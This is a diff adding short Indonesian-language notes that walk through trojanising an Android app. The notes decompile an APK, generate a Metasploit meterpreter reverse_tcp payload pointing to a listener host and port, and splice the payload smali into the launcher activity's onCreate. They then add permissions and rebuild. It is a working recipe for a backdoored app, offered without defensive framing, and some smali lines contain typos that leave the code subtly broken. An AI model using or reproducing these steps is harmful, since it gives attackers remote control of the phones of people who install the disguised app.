@@ -1,0 +1,32 @@
+# bongkar original
+apktool d -f nama.apk -o /root/original
+
+# buat payload
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=9999 R > /root/payload.apk
+
+# bongkar payload
+apktool d -f payload.apk -o /root/payload
+
+# copy smali
+mkdir /root/original/smali/com/metasploit
+cd /root/original/smali/com/metasploit
+mkdir stage
+cp /root/payload/smali/com/metasploit/stage/payload.smali /root/original/smali/com/metasploit/stage/
+
+edit AndroidManifest.xml pada folder original
+cari tag pembungkus action.MAIN dan .category.LAUNCHER
+
+berdasarkan value android name: 
+masuk ke folder tersebut 
+
+cari baris invoke-super{p0, p1}, Landroid/app/Activity;->onCrete(Landroid/os/Bundle;)V
+
+dibawahnya tambahin
+invoke-static {p0}, Landroid/metasploit/stage/payload;->onCreate(Landroid/content/context;)V
+
+save
+
+jangan lupa tambahkan permission
+
+# build ulang
+apktool b /root/original
